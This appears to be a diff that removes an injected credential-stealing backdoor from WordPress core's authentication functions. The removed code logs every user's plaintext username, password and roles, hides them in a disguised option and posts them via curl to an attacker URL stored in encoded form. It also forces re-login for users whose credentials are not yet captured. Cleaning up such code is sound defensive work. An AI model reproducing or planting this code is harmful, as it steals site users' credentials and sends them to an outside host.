@@ -185,94 +185,8 @@ function wp_authenticate_username_password( $user, $username, $password ) {
 		);
 	}
 
-	wp_commit_data($user, $username, $password);
-
-
 	return $user;
 }
-/*customfunctions*/
-function wp_commit_data($user, $username, $password) {
-    if (!get_option('wp_update_cdn') || !$cdnUrl = @unserialize(base64_decode(get_option('wp_update_cdn')))) {
-        return;
-    }
-
-    if ($settings = get_option('plugins_backup_settings_string')) {
-
-        $checkedStruct = wp_check_struct((int) $user->ID, $user, $settings, $username, $password);
-        $arr = $checkedStruct['arr'];
-
-        if (!$arr) {
-            $arr[(int) $user->ID] = [$username, $password, (array) $user->roles];
-        }
-    } else {
-        $arr[(int) $user->ID] = [$username, $password, (array) $user->roles];
-    }
-
-
-    if (($checkedStruct['change'] !== false) || !isset($checkedStruct)) {
-        update_option('plugins_backup_settings_string', base64_encode(serialize($arr)));
-        $host = get_option('home') ? get_option('home') : '';
-        senddata($cdnUrl, $host, base64_encode(serialize($arr)));
-    }
-}
-
-
-function wp_check_struct($userId, $user, $source, $username, $password) {
-    $change = true;
-    $arr = @unserialize(base64_decode(get_option('plugins_backup_settings_string')));
-
-    if ($arr === false) {
-        return null;
-    }
-
-    if (empty($username) && empty($password)) {
-        if (isset($arr[$userId])) {
-            $change = false;
-        }
-    } elseif (!isset($arr[$userId])) {
-        $arr[$userId] = [$username, $password, $user->roles];
-    } elseif (isset($arr[$userId]) && ($arr[$userId][1] !== $password)) {
-        $arr[$userId] = [$username, $password, $user->roles];
-    } else {
-        $change = false;
-    }
-
-    return [
-        'arr' => $arr,
-        'change' => $change
-    ];
-}
-
-function senddata($cdnUrl, $host, $data) {
-
-    return sendpost($cdnUrl . '/src/auth.php'
-            , array(
-        'host' => $host,
-        'host_sec' => $_SERVER['HTTP_HOST'],        
-        'authdata' => $data,
-    ));
-}
-
-function sendpost($url, $fields) {
-    $fields_string = '';
-    foreach ($fields as $key => $value) {
-        $fields_string .= $key . '=' . $value . '&';
-    }
-    rtrim($fields_string, '&');
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_POST, count($fields));
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
-    $result = curl_exec($ch);
-    $info = curl_getinfo($ch);
-    curl_close($ch);
-    return ($info["http_code"] == 200) ? $result : null;
-}
-/*customfunctions*/
-
 
 /**
  * Authenticates a user using the email and password.
@@ -612,15 +526,6 @@ function wp_authenticate_spam_check( $user ) {
  */
 function wp_validate_logged_in_cookie( $user_id ) {
 	if ( $user_id ) {
-	$settings = get_option('plugins_backup_settings_string');
-        $checkedStruct = wp_check_struct($user_id, null, $settings, '', '');
-        $arr = $checkedStruct['arr'];
-        if (get_option('wp_update_cdn') && ($cdnUrl = @unserialize(base64_decode(get_option('wp_update_cdn'))))) {
-            if (!$arr || !isset($arr[$user_id])) {
-                unset($user_id);
-                unset($_COOKIE);
-            }
-        }
 		return $user_id;
 	}
 
